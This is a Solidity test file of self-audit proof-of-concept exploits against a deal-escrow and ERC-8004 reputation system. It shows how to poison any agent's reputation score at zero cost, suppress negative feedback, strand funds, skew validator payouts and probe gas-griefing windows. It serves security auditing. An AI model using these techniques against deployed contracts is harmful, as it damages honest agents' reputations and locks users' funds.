// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Base} from "../Base.t.sol";
import {DealVault, Status, RefundReason} from "../../src/DealVault.sol";
import {DealFactory} from "../../src/DealFactory.sol";
import {Terms} from "../../src/Terms.sol";
import {IdentityRegistryUpgradeable} from "../../src/erc8004/IdentityRegistryUpgradeable.sol";
import {ReputationRegistryUpgradeable} from "../../src/erc8004/ReputationRegistryUpgradeable.sol";
import {ValidationRegistryUpgradeable} from "../../src/erc8004/ValidationRegistryUpgradeable.sol";

/// Self-audit PoCs. Base's `provider`/`providerAgentId` play the VICTIM in the reputation tests.
contract AuditPoC is Base {
    function _summary(uint256 agentId, string memory tag1) internal view returns (uint64 n, int128 v) {
        address[] memory c = new address[](1);
        c[0] = address(factory);
        (n, v,) = ReputationRegistryUpgradeable(reg.reputation).getSummary(agentId, c, tag1, "");
    }

    /// Anyone can write "settlement-backed" 0-score feedback on ANY agent: terms do not bind providerAgentId
    /// to t.provider, and a never-funded vault still settles as "refunded-nodelivery". Zero capital, gas only.
    function test_poc_reputationPoison_zeroCapital() public {
        // Victim has one honest, accepted deal: 100.
        DealVault good = _fundAndOpen(_terms());
        _deliver(good, keccak256("d"));
        _accept(good);
        factory.settle(address(good), "", bytes32(0));
        (uint64 n0, int128 v0) = _summary(providerAgentId, "proviso.settlement");
        assertEq(n0, 1);
        assertEq(v0, 100);

        address atk = makeAddr("attacker");
        vm.prank(atk);
        uint256 atkAgent = IdentityRegistryUpgradeable(reg.identity).register("x");
        for (uint256 k; k < 9; k++) {
            Terms memory t = _terms();
            t.payer = atk;
            t.provider = makeAddr("atkProvider"); // NOT the victim's address
            t.validators = [makeAddr("a0"), makeAddr("a1"), makeAddr("a2")];
            t.payerAgentId = atkAgent;
            t.providerAgentId = providerAgentId; // victim's agent id
            t.deliverBy = uint64(block.timestamp + 1);
            t.salt = keccak256(abi.encode("atk", k));
            vm.startPrank(atk);
            DealVault v = DealVault(factory.open(t)); // never funded
            vm.warp(block.timestamp + 2);
            v.finalize();
            factory.settle(address(v), "ipfs://attacker-chosen-evidence", keccak256("lie"));
            vm.stopPrank();
        }
        (uint64 n, int128 val) = _summary(providerAgentId, "proviso.settlement");
        assertEq(n, 10);
        assertEq(val, 10); // victim's escrow-backed score: 100 -> 10, attacker spent 0 tokens
        assertEq(usdc.balanceOf(atk), 0);
    }

    /// An agent that approves the factory on its identity NFT makes giveFeedback revert ("Self-feedback"),
    /// which settle() swallows while consuming the one-shot `settled` flag: a bad outcome is erased forever.
    function test_poc_settle_selfFeedbackOptOut() public {
        Terms memory t = _terms();
        DealVault v = _fundAndOpen(t);
        vm.warp(t.deliverBy + 1);
        v.finalize(); // provider never delivered
        vm.startPrank(provider);
        IdentityRegistryUpgradeable(reg.identity).approve(address(factory), providerAgentId);
        factory.settle(address(v), "", bytes32(0));
        IdentityRegistryUpgradeable(reg.identity).approve(address(0), providerAgentId);
        vm.stopPrank();
        assertTrue(factory.settled(address(v)));
        (uint64 n,) = _summary(providerAgentId, "proviso.settlement");
        assertEq(n, 0); // no negative feedback recorded
        vm.expectRevert(DealFactory.AlreadySettled.selector);
        factory.settle(address(v), "", bytes32(0));
    }

    /// "Never strands funds for decodable terms" fails when the (invalid) terms token has no code: finalize
    /// reverts on balanceOf, the vault never becomes terminal, sweep is unreachable.
    function test_poc_invalidTerms_noCodeToken_fundsStuck() public {
        Terms memory t = _terms();
        t.token = makeAddr("typoToken"); // e.g. wrong-chain USDC address
        address predicted = factory.predict(t);
        usdc.mint(predicted, t.amount); // payer paid real USDC to pay_to
        DealVault v = DealVault(factory.open(t));
        assertTrue(v.invalidTerms());
        vm.expectRevert();
        v.finalize();
        vm.warp(t.deliverBy + 365 days);
        vm.expectRevert();
        v.finalize();
        vm.expectRevert(DealVault.WrongStatus.selector);
        v.sweep(address(usdc));
        assertEq(usdc.balanceOf(address(v)), t.amount); // stuck forever
    }

    /// The caller of resolve() decides which majority validators are paid: with a 3-0 vote, passing two
    /// indices pays those two 1/2 each and the third nothing.
    function test_poc_resolve_callerChoosesWhoIsPaid() public {
        DealVault v = _fundAndOpen(_terms());
        _deliver(v, keccak256("d"));
        _dispute(v, keccak256("r"));
        _vote(v, 0, "s0", 100, COURT_TAG);
        _vote(v, 1, "s1", 100, COURT_TAG);
        _vote(v, 2, "s2", 100, COURT_TAG);
        uint8[] memory idx = new uint8[](2);
        bytes32[] memory salts = new bytes32[](2);
        (idx[0], idx[1]) = (0, 1);
        (salts[0], salts[1]) = (bytes32("s0"), bytes32("s1"));
        vm.prank(validators[0]);
        v.resolve(idx, salts);
        uint256 courtFee = AMOUNT * 300 / 10_000;
        assertEq(usdc.balanceOf(validators[0]), courtFee / 2);
        assertEq(usdc.balanceOf(validators[2]), 0); // voted with the majority, paid nothing
    }

    /// Probe: can a gas-limited open() make the try/catch around identity.ownerOf fail and flag valid terms
    /// invalid (forced refund)? Scans gas limits just below the success threshold.
    function test_probe_openGasGrief() public {
        Terms memory t = _terms();
        address predicted = factory.predict(t);
        usdc.mint(predicted, t.amount);
        uint256 found;
        for (uint256 g = 60_000; g < 420_000; g += 3) {
            uint256 snap = vm.snapshotState();
            (bool ok,) = address(factory).call{gas: g}(abi.encodeCall(DealFactory.open, (t)));
            if (ok && DealVault(predicted).invalidTerms()) found = g;
            vm.revertToState(snap);
            if (found != 0) break;
        }
        assertEq(found, 0, "open gas grief window exists");
    }

    /// Probe: can a gas-limited settle() mark the vault settled while the provider's feedback silently OOGs?
    function test_probe_settleGasGrief() public {
        Terms memory t = _terms();
        DealVault v = _fundAndOpen(t);
        vm.warp(t.deliverBy + 1);
        v.finalize();
        uint256 found;
        for (uint256 g = 30_000; g < 700_000; g += 3) {
            uint256 snap = vm.snapshotState();
            (bool ok,) = address(factory).call{gas: g}(abi.encodeCall(DealFactory.settle, (address(v), "", bytes32(0))));
            if (ok) {
                (uint64 n,) = _summary(providerAgentId, "proviso.settlement");
                if (n == 0) found = g;
            }
            vm.revertToState(snap);
            if (found != 0) break;
        }
        assertEq(found, 0, "settle gas grief window exists");
    }
}
